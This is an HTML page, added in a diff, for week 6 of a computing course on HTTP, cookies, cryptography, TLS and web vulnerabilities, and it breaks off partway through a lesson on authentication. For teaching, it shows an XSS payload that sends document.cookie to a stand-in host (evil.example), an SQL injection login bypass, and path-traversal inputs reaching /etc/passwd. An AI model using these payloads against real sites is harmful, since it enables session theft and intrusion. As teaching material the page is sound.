@@ -1,0 +1,435 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Week 6: The web, cryptography and security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=Public+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="../../assets/audit.css">
+<link rel="stylesheet" href="../../assets/syllabus.css">
+</head>
+<body>
+<div class="wrap syl">
+  <header class="masthead">
+    <nav class="crumbs"><a href="../index.html">← Syllabus</a></nav>
+    <span class="eyebrow">Week 6 of 10 · about 10 hours</span>
+    <h1>The web, cryptography and security</h1>
+    <p class="lede">This week builds on networking: first how the web actually works at the HTTP level, then the cryptography that makes it safe to use, and then the mistakes that make web applications unsafe anyway. In the project you'll attack a deliberately vulnerable app, then fix every hole you found. Seeing an attack work is the fastest way to understand why the defenses look the way they do.</p>
+  </header>
+
+  <div id="week-progress" class="progress-card"></div>
+
+  <section class="panel plan-panel">
+    <h3>By the end of this week you can</h3>
+    <ul>
+      <li>Read and write raw HTTP requests and responses, including caching and cookies</li>
+      <li>Explain the same-origin policy, CORS, and cookie security attributes</li>
+      <li>Choose correctly between hashing, MACs, encryption and encoding, and store passwords safely</li>
+      <li>Explain public-key cryptography, key exchange, certificates and the TLS handshake</li>
+      <li>Find and fix SQL injection, XSS, CSRF, path traversal and broken access control</li>
+      <li>Design authentication and sessions securely, and reason about threats</li>
+    </ul>
+    <h3>Suggested schedule</h3>
+    <div class="table-wrap"><table class="schedule">
+      <tr><td>Day 1</td><td>Lessons 6.1 and 6.2 (HTTP, browsers and cookies)</td></tr>
+      <tr><td>Day 2</td><td>Lessons 6.3 and 6.4 (cryptography, TLS)</td></tr>
+      <tr><td>Day 3</td><td>Lessons 6.5 and 6.6 (vulnerabilities, authentication)</td></tr>
+      <tr><td>Days 4–5</td><td>Mini-project: break it, then fix it</td></tr>
+      <tr><td>Day 6</td><td>End-of-week quiz, then self-rating and reflection</td></tr>
+    </table></div>
+    <div class="note-box warn"><strong>Ground rule</strong><p>Only test attacks against systems you own or have written permission to test, like this week's project, which runs only on your own machine. Trying these techniques on other people's sites is illegal in most countries, even "just to see". PortSwigger's free Web Security Academy has legal practice labs if you want more.</p></div>
+  </section>
+
+  <!-- ===================== Lesson 6.1 ===================== -->
+  <section class="lesson" id="w6-l1">
+    <header><span class="eyebrow">Lesson 6.1 · 45 min</span><h2>HTTP in depth</h2></header>
+
+    <p><b>HTTP</b> is a text-based request–response protocol that runs over TCP (or QUIC for HTTP/3). The client sends a request, the server sends one response, and that's the whole conversation. Here's what's actually on the wire:</p>
+    <pre class="code"><code>POST /api/orders HTTP/1.1                   <span class="c">← method, path, version</span>
+Host: shop.example.com                      <span class="c">← headers: "Name: value"</span>
+Content-Type: application/json
+Content-Length: 27
+Cookie: session=8f2a91c4e7
+                                            <span class="c">← blank line ends the headers</span>
+{"item": "book", "qty": 2}                  <span class="c">← optional body</span>
+
+HTTP/1.1 201 Created                        <span class="c">← version, status code, reason</span>
+Content-Type: application/json
+Location: /api/orders/1042
+Cache-Control: no-store
+
+{"id": 1042, "status": "pending"}</code></pre>
+    <p>You can see this yourself with <code>curl -v https://example.com</code>, or in the Network tab of your browser's developer tools.</p>
+
+    <h3>Methods</h3>
+    <ul>
+      <li><b>GET</b> fetches a resource. It must be <b>safe</b> (no side effects), which lets browsers, proxies and crawlers repeat or prefetch it freely.</li>
+      <li><b>POST</b> submits data or creates something. Not safe, and not idempotent: sending it twice may create two orders.</li>
+      <li><b>PUT</b> replaces a resource and <b>DELETE</b> removes one. Both are <b>idempotent</b>: doing them twice has the same effect as once, so they're safe to retry.</li>
+      <li><b>PATCH</b> partially updates a resource.</li>
+    </ul>
+
+    <h3>Status codes</h3>
+    <div class="table-wrap"><table class="data">
+      <thead><tr><th>Class</th><th>Meaning</th><th>Ones to know</th></tr></thead>
+      <tbody>
+        <tr><td>2xx</td><td>Success</td><td>200 OK, 201 Created, 204 No Content</td></tr>
+        <tr><td>3xx</td><td>Go elsewhere</td><td>301 Moved Permanently, 302 / 303 redirect, 304 Not Modified</td></tr>
+        <tr><td>4xx</td><td>The client did something wrong</td><td>400 Bad Request, 401 not authenticated, 403 Forbidden, 404 Not Found, 409 Conflict, 429 Too Many Requests</td></tr>
+        <tr><td>5xx</td><td>The server failed</td><td>500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout</td></tr>
+      </tbody>
+    </table></div>
+    <p>The 4xx/5xx split matters operationally: alerts usually fire on 5xx rates, because those are your bugs. A 502 or 504 usually comes from a proxy or load balancer in front of your app, telling you the app behind it didn't answer properly.</p>
+
+    <h3>State, cookies and caching</h3>
+    <p>HTTP is <b>stateless</b>: each request stands alone. To remember a logged-in user, the server sends <code>Set-Cookie: session=…</code>, and the browser returns it in a <code>Cookie</code> header with every later request to that site. Lesson 6.2 covers how to do that safely.</p>
+    <p><b>Caching</b> headers tell browsers and CDNs what they may reuse. <code>Cache-Control: max-age=3600</code> means "reuse this for an hour without asking". An <code>ETag</code> lets a client ask "has this changed?" and get a tiny <code>304 Not Modified</code> instead of the full body. <code>Cache-Control: no-store</code> is for anything private, like account pages.</p>
+
+    <h3>HTTP/1.1, 2 and 3</h3>
+    <p>HTTP/1.1 sends one request at a time per connection, so browsers open several connections. <b>HTTP/2</b> multiplexes many requests over one TCP connection, using binary framing and compressed headers. <b>HTTP/3</b> runs over QUIC on UDP, which removes TCP's head-of-line blocking (week 5) and sets up encryption faster. The methods, status codes and headers are the same in all three; only the transport changed.</p>
+
+    <div class="check" data-id="w6-c1" data-answer="2">
+      <p class="check-q">A "Delete account" link is implemented as <code>GET /account/delete</code>. Why is that a bad idea?</p>
+      <ol class="check-o"><li>GET requests can't carry cookies</li><li>GET requests are slower</li><li>GET is supposed to be safe, so browsers, link previews and crawlers may request it automatically, and an attacker's page can trigger it with a simple image tag</li><li>DELETE is the only method that can delete things</li></ol>
+      <div class="check-why">Anything that changes state should be POST (or DELETE, PUT, PATCH) and protected against CSRF (lesson 6.5). Link-preview bots have deleted real data this way.</div>
+    </div>
+    <div class="check" data-id="w6-c2" data-answer="1">
+      <p class="check-q">Your monitoring shows a spike in <code>502 Bad Gateway</code> errors. Where should you look first?</p>
+      <ol class="check-o"><li>The users' browsers</li><li>The application servers behind the load balancer or proxy, which are crashing, refusing connections or returning invalid responses</li><li>DNS</li><li>Nowhere; 502s are normal</li></ol>
+      <div class="check-why">A 502 is generated by the proxy, reporting that the upstream server failed it. The proxy itself is usually fine.</div>
+    </div>
+
+    <div class="videos">
+      <a class="video" href="https://www.youtube.com/watch?v=guvsH5OFizE" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/guvsH5OFizE/mqdefault.jpg" alt="" loading="lazy"><span><b>The World Wide Web</b><small>Crash Course Computer Science #30</small></span></a>
+    </div>
+  </section>
+
+  <!-- ===================== Lesson 6.2 ===================== -->
+  <section class="lesson" id="w6-l2">
+    <header><span class="eyebrow">Lesson 6.2 · 40 min</span><h2>Browsers, origins and cookies</h2></header>
+
+    <h3>The same-origin policy</h3>
+    <p>Your browser runs code from many websites at once, in tabs, iframes and scripts. The <b>same-origin policy</b> keeps them apart. An <b>origin</b> is the combination of scheme, host and port: <code>https://bank.com:443</code>. A page can freely read data from its own origin, but JavaScript on <code>evil.com</code> cannot read the responses of requests it makes to <code>bank.com</code>, and cannot read <code>bank.com</code>'s pages or storage.</p>
+    <div class="table-wrap"><table class="data">
+      <thead><tr><th>Compared with https://app.example.com</th><th>Same origin?</th></tr></thead>
+      <tbody>
+        <tr><td><code>https://app.example.com/settings</code></td><td>Yes (only the path differs)</td></tr>
+        <tr><td><code>http://app.example.com</code></td><td>No (different scheme)</td></tr>
+        <tr><td><code>https://api.example.com</code></td><td>No (different host)</td></tr>
+        <tr><td><code>https://app.example.com:8443</code></td><td>No (different port)</td></tr>
+      </tbody>
+    </table></div>
+    <p>Note what the policy does <i>not</i> stop: a page can still <b>send</b> requests to other origins (submit forms, load images and scripts). It just can't read the responses. That gap is exactly what CSRF attacks exploit (lesson 6.5).</p>
+
+    <h3>CORS</h3>
+    <p>Sometimes you want cross-origin reads, such as your front end at <code>app.example.com</code> calling your API at <code>api.example.com</code>. <b>CORS</b> (cross-origin resource sharing) lets the API opt in: it responds with <code>Access-Control-Allow-Origin: https://app.example.com</code>, and the browser lets that page read the response. For non-simple requests (custom headers, JSON bodies, PUT or DELETE), the browser first sends an <code>OPTIONS</code> <b>preflight</b> request to ask permission. CORS is enforced by browsers only. It doesn't stop curl or another server calling your API, so it's not an access control mechanism. Never reflect any origin back combined with <code>Allow-Credentials: true</code>; that lets every site read your users' data.</p>
+
+    <h3>Sessions and cookie attributes</h3>
+    <p>After login, the server creates a <b>session</b>: a long random ID stored server-side alongside the user's identity, and sent to the browser as a cookie. The ID is the user's credential for as long as it's valid, so the cookie needs protecting:</p>
+    <pre class="code"><code>Set-Cookie: session=Qm9vLXlhaC1yYW5kb20tMzItYnl0ZXM; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=86400</code></pre>
+    <ul>
+      <li><b>HttpOnly</b>: JavaScript can't read it, so an XSS bug can't simply steal it.</li>
+      <li><b>Secure</b>: only sent over HTTPS, never in plain text.</li>
+      <li><b>SameSite=Lax</b> (or Strict): not sent on most cross-site requests, which blocks most CSRF. Lax is the default in modern browsers.</li>
+      <li><b>Max-Age</b> or <b>Expires</b>: limit how long it lives. Without one, it's a session cookie that lasts until the browser closes.</li>
+    </ul>
+    <p>The alternative is a <b>token</b> such as a <b>JWT</b>: a signed blob containing the user ID and expiry, which the server can verify without a database lookup. The payload is readable by anyone (it's only Base64-encoded), so never put secrets in it, and a signed token can't easily be revoked before it expires. Storing tokens in <code>localStorage</code> makes them readable by any script on the page, which is why HttpOnly cookies are generally the safer place for browser sessions.</p>
+
+    <div class="check" data-id="w6-c3" data-answer="3">
+      <p class="check-q">A page on <code>https://shop.example.com</code> calls <code>fetch("https://shop.example.com:8443/api/cart")</code>. Is that a cross-origin request?</p>
+      <ol class="check-o"><li>No, the host is the same</li><li>No, both use HTTPS</li><li>Only if cookies are sent</li><li>Yes, because the port is different (443 vs 8443)</li></ol>
+      <div class="check-why">Scheme, host and port must all match. The API would need to send CORS headers for the page to read the response.</div>
+    </div>
+    <div class="check" data-id="w6-c4" data-answer="0">
+      <p class="check-q">Which cookie attribute stops a successful XSS attack from reading the session ID with <code>document.cookie</code>?</p>
+      <ol class="check-o"><li>HttpOnly</li><li>Secure</li><li>SameSite</li><li>Path</li></ol>
+      <div class="check-why">HttpOnly hides the cookie from scripts. (The injected script can still act as the user while the page is open, so preventing XSS still matters.)</div>
+    </div>
+  </section>
+
+  <!-- ===================== Lesson 6.3 ===================== -->
+  <section class="lesson" id="w6-l3">
+    <header><span class="eyebrow">Lesson 6.3 · 50 min</span><h2>Cryptography building blocks</h2></header>
+
+    <p>Most security mistakes with cryptography come from using the wrong tool, not from broken algorithms. Four tools are easy to confuse:</p>
+    <div class="table-wrap"><table class="data">
+      <thead><tr><th>Tool</th><th>Key?</th><th>Reversible?</th><th>Use it for</th><th>Examples</th></tr></thead>
+      <tbody>
+        <tr><td>Encoding</td><td>No</td><td>Yes, by anyone</td><td>Representing bytes as text. Provides no security at all.</td><td>Base64, hex, URL encoding</td></tr>
+        <tr><td>Hashing</td><td>No</td><td>No</td><td>Fingerprints, integrity checks, (slow, salted) password storage</td><td>SHA-256, SHA-3; bcrypt, scrypt, Argon2, PBKDF2 for passwords</td></tr>
+        <tr><td>MAC</td><td>Yes (shared secret)</td><td>No</td><td>Proving a message came from someone with the key and wasn't altered</td><td>HMAC-SHA256</td></tr>
+        <tr><td>Encryption</td><td>Yes</td><td>Yes, with the key</td><td>Keeping data secret</td><td>AES-GCM, ChaCha20-Poly1305; RSA, elliptic curves</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>Cryptographic hashes</h3>
+    <p>A cryptographic hash function turns any input into a fixed-size digest (256 bits for SHA-256) with three key properties: you can't work backwards from a digest to the input (<b>preimage resistance</b>), you can't find two inputs with the same digest (<b>collision resistance</b>), and any change to the input completely changes the output (the <b>avalanche effect</b>).</p>
+
+    <div data-widget="hash"></div>
+
+    <p>MD5 and SHA-1 are broken for collision resistance, and practical collisions have been demonstrated. Don't use them for anything security-related.</p>
+
+    <h3>Storing passwords</h3>
+    <p>You should never be able to recover a user's password, so store a hash. But a <b>fast</b> hash like SHA-256 is the wrong choice: attackers with a stolen database and a GPU can try billions of guesses per second. Use a deliberately <b>slow</b> password hashing function (<b>Argon2id</b>, <b>scrypt</b>, <b>bcrypt</b>, or <b>PBKDF2</b> with hundreds of thousands of iterations) together with a random per-user <b>salt</b>:</p>
+    <pre class="code"><code>import hashlib, hmac, secrets
+
+def hash_password(password: str) -&gt; str:
+    salt = secrets.token_bytes(16)                              <span class="c"># unique per user</span>
+    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 600_000)
+    return f"pbkdf2_sha256$600000${salt.hex()}${digest.hex()}"
+
+def verify_password(password: str, stored: str) -&gt; bool:
+    _, iterations, salt_hex, digest_hex = stored.split("$")
+    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt_hex), int(iterations))
+    return hmac.compare_digest(digest.hex(), digest_hex)        <span class="c"># constant-time comparison</span></code></pre>
+    <p>The salt makes identical passwords hash differently and defeats precomputed lookup tables (<b>rainbow tables</b>). Storing the algorithm and iteration count with the hash lets you strengthen them later. <code>hmac.compare_digest</code> takes the same time whether the first byte or the last byte differs, so attackers can't learn anything from response timings.</p>
+
+    <h3>Symmetric encryption and MACs</h3>
+    <p><b>Symmetric</b> ciphers use the same key to encrypt and decrypt. <b>AES</b> is the standard, and it's hardware-accelerated in most CPUs. Always use an <b>authenticated encryption</b> mode such as <b>AES-GCM</b> or <b>ChaCha20-Poly1305</b>: it detects any tampering with the ciphertext, not just keeps it secret. Never reuse a nonce with the same key, and never design your own scheme; use a well-reviewed library.</p>
+    <p>An <b>HMAC</b> is a keyed hash. Anyone with the key can compute <code>HMAC(key, message)</code>, and without the key it's infeasible to produce a valid one. It's how servers sign session cookies, API webhooks and JWTs, so they can detect any change.</p>
+
+    <h3>Randomness</h3>
+    <p>Keys, session IDs, password reset tokens and salts must come from a <b>cryptographically secure</b> random number generator. In Python that's the <code>secrets</code> module. The <code>random</code> module is predictable: given a few outputs, an attacker can work out the next ones.</p>
+
+    <div class="check" data-id="w6-c5" data-answer="1">
+      <p class="check-q">A developer stores passwords as <code>sha256(password)</code>. What's the most important problem?</p>
+      <ol class="check-o"><li>SHA-256 is reversible</li><li>It's fast and unsalted: identical passwords produce identical hashes, and attackers can test billions of guesses per second against a stolen database</li><li>SHA-256 outputs are too long to store</li><li>Nothing; SHA-256 is secure</li></ol>
+      <div class="check-why">SHA-256 is fine for integrity, but terrible for passwords. Use a slow, salted algorithm designed for passwords.</div>
+    </div>
+    <div class="check" data-id="w6-c6" data-answer="2">
+      <p class="check-q">An API sends webhooks to your server. How can you check that a webhook really came from the API provider and wasn't modified?</p>
+      <ol class="check-o"><li>Check that the request body is valid JSON</li><li>Base64-decode the body</li><li>The provider includes an HMAC of the body computed with a secret you share; you recompute it and compare with <code>hmac.compare_digest</code></li><li>Check the User-Agent header</li></ol>
+      <div class="check-why">Only someone with the shared secret can produce a valid HMAC, and any change to the body changes it. Headers like User-Agent can be set to anything.</div>
+    </div>
+
+    <div class="videos">
+      <a class="video" href="https://www.youtube.com/watch?v=jhXCTbFnK8o" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/jhXCTbFnK8o/mqdefault.jpg" alt="" loading="lazy"><span><b>Cryptography</b><small>Crash Course Computer Science #33</small></span></a>
+      <a class="video" href="https://www.youtube.com/watch?v=8ZtInClXe1Q" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/8ZtInClXe1Q/mqdefault.jpg" alt="" loading="lazy"><span><b>How NOT to Store Passwords!</b><small>Computerphile</small></span></a>
+      <a class="video" href="https://www.youtube.com/watch?v=wlSG3pEiQdc" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/wlSG3pEiQdc/mqdefault.jpg" alt="" loading="lazy"><span><b>Securing Stream Ciphers (HMAC)</b><small>Computerphile</small></span></a>
+    </div>
+  </section>
+
+  <!-- ===================== Lesson 6.4 ===================== -->
+  <section class="lesson" id="w6-l4">
+    <header><span class="eyebrow">Lesson 6.4 · 50 min</span><h2>Public keys, certificates and TLS</h2></header>
+
+    <p>Symmetric encryption has a chicken-and-egg problem: you need a shared secret key, but how do you share it with a website you've never visited, over a network anyone can watch? Public-key cryptography solves it.</p>
+
+    <h3>Public and private keys</h3>
+    <p>In <b>public-key</b> (asymmetric) cryptography, each party has a key pair. The <b>public key</b> can be shared with the world; the <b>private key</b> never leaves its owner. They do two different jobs:</p>
+    <ul>
+      <li><b>Encryption</b>: anyone encrypts with your public key, and only your private key decrypts.</li>
+      <li><b>Signatures</b>: you sign with your private key, and anyone verifies with your public key. A valid signature proves the message came from the key's owner and wasn't changed.</li>
+    </ul>
+    <p>Public-key operations are slow, so real systems use them only to authenticate and to agree on a symmetric key, then switch to fast symmetric encryption for the actual data. That's <b>hybrid encryption</b>.</p>
+
+    <h3>Key exchange</h3>
+    <p><b>Diffie–Hellman</b> lets two parties agree on a shared secret over a public channel, without ever sending the secret. Each picks a private number, sends a public value derived from it, and combines the other side's public value with their own private number. Both arrive at the same result, but an eavesdropper who saw everything can't compute it, because doing so means solving the discrete logarithm problem, which is infeasible for large numbers.</p>
+
+    <div data-widget="dh"></div>
+
+    <p>Diffie–Hellman alone has a weakness: it proves nothing about <i>who</i> you agreed a key with. An attacker in the middle could run one exchange with you and another with the server. Signatures and certificates close that hole.</p>
+
+    <h3>Certificates</h3>
+    <p>A <b>certificate</b> binds a domain name to a public key, and is signed by a <b>certificate authority</b> (CA). Your OS and browser ship with a list of trusted root CAs. When a site presents its certificate, the browser checks:</p>
+    <ul>
+      <li>the certificate is for this exact domain name</li>
+      <li>it's within its validity dates and hasn't been revoked</li>
+      <li>its signature chain leads (usually through an intermediate CA) to a trusted root</li>
+    </ul>
+    <p><b>Let's Encrypt</b> issues free certificates automatically by checking that you control the domain, which is why nearly the whole web now uses HTTPS. <b>Certificate Transparency</b> logs publicly record every certificate issued, so a mistakenly issued one for your domain can be spotted.</p>
+
+    <h3>The TLS 1.3 handshake</h3>
+    <ol>
+      <li><b>Client hello</b>: the client sends the TLS versions and cipher suites it supports, plus its key-exchange share (an ephemeral Diffie–Hellman public value).</li>
+      <li><b>Server hello</b>: the server picks a cipher suite, sends its own key-exchange share, and both sides now compute the same shared secret. Everything after this is encrypted.</li>
+      <li>The server sends its <b>certificate</b> and a <b>signature</b> over the handshake made with its private key, proving it owns the certificate's key and that nobody tampered with the exchange.</li>
+      <li>The client verifies the certificate chain and signature. Both sides derive symmetric session keys, and encrypted HTTP traffic begins. All of this takes one round trip.</li>
+    </ol>
+    <p>Because the Diffie–Hellman values are <b>ephemeral</b> (thrown away after each connection), TLS 1.3 has <b>forward secrecy</b>: even if the server's private key is stolen later, recorded past traffic can't be decrypted.</p>
+
+    <h3>What HTTPS does and doesn't protect</h3>
+    <p>HTTPS gives <b>confidentiality</b> (nobody on the path can read the traffic), <b>integrity</b> (nobody can change it unnoticed) and <b>server authentication</b> (you're talking to whoever controls that domain). It does not make the site trustworthy (phishing sites have valid certificates), it doesn't hide which site you're visiting from your network (the domain name and IP address are visible), and it does nothing about vulnerabilities in the application itself.</p>
+
+    <div class="check" data-id="w6-c7" data-answer="3">
+      <p class="check-q">Why does TLS use public-key cryptography only during the handshake, then switch to AES or ChaCha20?</p>
+      <ol class="check-o"><li>Public-key encryption is less secure</li><li>Browsers don't support public keys after the handshake</li><li>Symmetric keys never expire</li><li>Public-key operations are far slower; they're used to authenticate and agree on a key, and fast symmetric encryption handles the data</li></ol>
+      <div class="check-why">Hybrid encryption: each tool does what it's good at.</div>
+    </div>
+    <div class="check" data-id="w6-c8" data-answer="1">
+      <p class="check-q">In the Diffie–Hellman widget, Eve sees p, g, A and B. Why can't she compute the shared secret with realistic key sizes?</p>
+      <ol class="check-o"><li>The values are encrypted</li><li>She'd need a or b, and recovering one from A = gᵃ mod p (the discrete logarithm) is computationally infeasible for large p</li><li>The shared secret is sent over a different channel</li><li>She can compute it easily; Diffie–Hellman is insecure</li></ol>
+      <div class="check-why">Computing gᵃ mod p is fast; reversing it is infeasible at 2048 bits or with elliptic curves. Authentication (certificates and signatures) is still needed to stop a man-in-the-middle.</div>
+    </div>
+
+    <div class="videos">
+      <a class="video" href="https://www.youtube.com/watch?v=GSIDS_lvRv4" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/GSIDS_lvRv4/mqdefault.jpg" alt="" loading="lazy"><span><b>Public Key Cryptography</b><small>Computerphile</small></span></a>
+      <a class="video" href="https://www.youtube.com/watch?v=NmM9HA2MQGI" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/NmM9HA2MQGI/mqdefault.jpg" alt="" loading="lazy"><span><b>Secret Key Exchange (Diffie–Hellman)</b><small>Computerphile</small></span></a>
+      <a class="video" href="https://www.youtube.com/watch?v=86cQJ0MMses" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/86cQJ0MMses/mqdefault.jpg" alt="" loading="lazy"><span><b>TLS Handshake Explained</b><small>Computerphile</small></span></a>
+    </div>
+  </section>
+
+  <!-- ===================== Lesson 6.5 ===================== -->
+  <section class="lesson" id="w6-l5">
+    <header><span class="eyebrow">Lesson 6.5 · 55 min</span><h2>Web vulnerabilities</h2></header>
+
+    <p>Most serious web vulnerabilities come from one root cause: <b>untrusted input being treated as code or as authority</b>. Everything a request contains (form fields, URLs, headers, cookies, uploaded files) is controlled by whoever sent it. The OWASP Top 10 is the standard list of the most common risks; these are the ones you'll exploit and fix in the project.</p>
+
+    <h3>SQL injection</h3>
+    <p>When user input is pasted into an SQL string, a quote character in the input ends the string early and everything after it becomes SQL. Try it:</p>
+
+    <div data-widget="sqli"></div>
+
+    <p>The fix is <b>parameterized queries</b>: send the SQL and the values separately, so the database never parses input as SQL.</p>
+    <pre class="code"><code><span class="c"># Vulnerable</span>
+db.execute(f"SELECT * FROM users WHERE username = '{username}'")
+<span class="c"># Safe: the ? placeholder is filled in by the database driver</span>
+db.execute("SELECT * FROM users WHERE username = ?", (username,))</code></pre>
+    <p>Escaping by hand is fragile; parameters are the real fix. ORMs use them for you, until someone writes raw SQL with string formatting. The same class of bug appears wherever input is spliced into an interpreter: shell commands (<b>command injection</b>: use <code>subprocess.run([...])</code> with a list, never <code>shell=True</code> with user input), LDAP queries, templates.</p>
+
+    <h3>Cross-site scripting (XSS)</h3>
+    <p>XSS is injection into HTML. If a page inserts a user's comment as raw HTML, a comment like <code>&lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;</code> becomes live code running on <i>your</i> origin, in every visitor's browser, with full access to the page and the user's session. <b>Stored</b> XSS is saved on the server (comments, profiles); <b>reflected</b> XSS bounces off a URL parameter; <b>DOM-based</b> XSS happens entirely in front-end JavaScript (<code>element.innerHTML = location.hash</code>).</p>
+    <p>Defenses, in order of importance:</p>
+    <ul>
+      <li><b>Escape output for its context.</b> In HTML, turn <code>&lt; &gt; &amp; " '</code> into entities (<code>html.escape</code> in Python). Template engines like Jinja2 and frameworks like React do this by default; the danger is in the escape hatches (<code>|safe</code>, <code>dangerouslySetInnerHTML</code>, <code>innerHTML</code>).</li>
+      <li>In JavaScript, set text with <code>textContent</code>, not <code>innerHTML</code>.</li>
+      <li>Add a <b>Content-Security-Policy</b> header that forbids inline scripts, so injected code doesn't run even if escaping is missed somewhere.</li>
+      <li>HttpOnly cookies limit the damage.</li>
+    </ul>
+
+    <h3>Cross-site request forgery (CSRF)</h3>
+    <p>You're logged into your bank. You visit a malicious page containing a hidden form that auto-submits to <code>https://bank.example/transfer</code>. Your browser attaches your bank cookie, because cookies are sent with requests to their site no matter which page triggered them, and the bank sees a legitimate, authenticated request. The attacker can't read the response (same-origin policy), but they don't need to: the money has moved.</p>
+    <p>Defenses: <b>SameSite</b> cookies stop the cookie being sent on cross-site POSTs. A <b>CSRF token</b> (a random value tied to the session, embedded in your own forms and checked on every state-changing request) proves the request came from your page, since the attacker's page can't read it. And never change state on GET.</p>
+
+    <h3>Path traversal</h3>
+    <p>A download endpoint that does <code>open("files/" + request.args["name"])</code> will happily open <code>files/../../etc/passwd</code>, or on Windows <code>files\..\..\secrets.env</code>. Resolve the full path and check it's still inside the intended directory, or better, don't take paths from users at all: look files up by an ID in your database.</p>
+
+    <h3>Broken access control</h3>
+    <p>Consistently near the top of the OWASP list. Being logged in isn't the same as being allowed: if <code>GET /invoices/1042</code> returns any invoice to any logged-in user, changing the number in the URL exposes other customers' invoices (an <b>IDOR</b>, insecure direct object reference). Check on the server, on every request, that this user may access this object. Hiding a button in the UI is not access control. A related bug is trusting client-supplied values the server should decide itself: prices, user IDs, roles, or a transfer amount of −100.</p>
+
+    <div class="check" data-id="w6-c9" data-answer="2">
+      <p class="check-q">A login query is built as <code>"... WHERE username = '" + u + "' AND password_hash = '" + h + "'"</code>. An attacker enters <code>admin' --</code> as the username. What happens?</p>
+      <ol class="check-o"><li>Login fails because the username doesn't exist</li><li>The database returns an error and nothing else</li><li>The quote closes the string and <code>--</code> comments out the password check, so they're logged in as admin</li><li>The input is automatically escaped</li></ol>
+      <div class="check-why">The query becomes <code>WHERE username = 'admin' --' AND ...</code>, and everything after <code>--</code> is ignored. Parameterized queries make this impossible.</div>
+    </div>
+    <div class="check" data-id="w6-c10" data-answer="0">
+      <p class="check-q">Why don't CORS rules or the same-origin policy prevent CSRF?</p>
+      <ol class="check-o"><li>They stop a page reading cross-origin responses, but not sending requests, and a CSRF attack only needs the request to be sent (with the victim's cookies)</li><li>CSRF only uses GET requests</li><li>CSRF attacks come from the server, not the browser</li><li>They do prevent it completely</li></ol>
+      <div class="check-why">That's why CSRF needs its own defenses: SameSite cookies and anti-CSRF tokens.</div>
+    </div>
+    <div class="check" data-id="w6-c11" data-answer="3">
+      <p class="check-q">A comments page uses Jinja2 templates, which escape output by default. Where would an XSS bug most likely come from?</p>
+      <ol class="check-o"><li>The database</li><li>Using HTTPS</li><li>Long comments</li><li>A place where escaping was deliberately bypassed, such as <code>{{ comment | safe }}</code>, or front-end code that inserts the comment with <code>innerHTML</code></li></ol>
+      <div class="check-why">Safe defaults move the risk to escape hatches. Search code reviews for <code>|safe</code>, <code>Markup(</code>, <code>innerHTML</code> and <code>dangerouslySetInnerHTML</code>.</div>
+    </div>
+    <div class="check" data-id="w6-c12" data-answer="1">
+      <p class="check-q">Logged-in users can view their orders at <code>/orders/5531</code>. One user changes the URL to <code>/orders/5530</code> and sees someone else's order. What kind of vulnerability is this?</p>
+      <ol class="check-o"><li>SQL injection</li><li>Broken access control (an IDOR): the server checks that the user is logged in, but not that the order belongs to them</li><li>XSS</li><li>A TLS problem</li></ol>
+      <div class="check-why">Check ownership on the server for every object access. Random IDs make guessing harder but are not a substitute for the check.</div>
+    </div>
+
+    <div class="videos">
+      <a class="video" href="https://www.youtube.com/watch?v=ciNHn38EyRc" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/ciNHn38EyRc/mqdefault.jpg" alt="" loading="lazy"><span><b>Running an SQL Injection Attack</b><small>Computerphile</small></span></a>
+      <a class="video" href="https://www.youtube.com/watch?v=zv0kZKC6GAM" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/zv0kZKC6GAM/mqdefault.jpg" alt="" loading="lazy"><span><b>How the Self-Retweeting Tweet Worked (XSS)</b><small>Tom Scott</small></span></a>
+      <a class="video" href="https://www.youtube.com/watch?v=T1QEs3mdJoc" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/T1QEs3mdJoc/mqdefault.jpg" alt="" loading="lazy"><span><b>Cookie Stealing</b><small>Computerphile</small></span></a>
+    </div>
+  </section>
+
+  <!-- ===================== Lesson 6.6 ===================== -->
+  <section class="lesson" id="w6-l6">
+    <header><span class="eyebrow">Lesson 6.6 · 40 min</span><h2>Authentication and secure design</h2></header>
+
+    <h3>Authentication done properly</h3>
+    <p><b>Authentication</b> establishes who someone is; <b>authorization</b> decides what they may do. For authentication:</p>
+    <ul>
+      <li>Store passwords with a slow, salted hash (lesson 6.3). Allow long passwords and check new ones against lists of known-breached passwords, rather than imposing composition rules.</li>
+      <li>Offer <b>multi-factor authentication</b>. Authenticator apps are good; hardware keys and <b>passkeys</b> are better, because they're bound to the real site's origin, so a phishing site can't capture and replay them. SMS codes are the weakest option.</li>
+      <li><b>Rate-limit</b> login attempts per account and per IP to slow down guessing and credential stuffing.</li>
+      <li>Give the same error for "no such user" and "wrong password", so attackers can't discover which accounts exist.</li>
+    </ul>
+
+    <h3>Sessions</h3>
+    <ul>
+      <li>Generate session IDs with a secure random generator (<code>secrets.token_urlsafe(32)</code>). Never derive them from the username or a counter.</li>
+      <li>Issue a <b>new</b> session ID at login (stops session fixation), and delete it on the server at logout.</li>
+      <li>Expire sessions after inactivity, and require re-authentication for sensitive actions like changing a password or email.</li>
+      <li>Set HttpOnly, Secure and SameSite on the cookie.</li>
+    </ul>
+
+    <h3>Principles that prevent whole classes of bugs</h3>
+    <ul>
+      <li><b>Never trust the client.</b> Validate and authorize everything on the server, every time.</li>
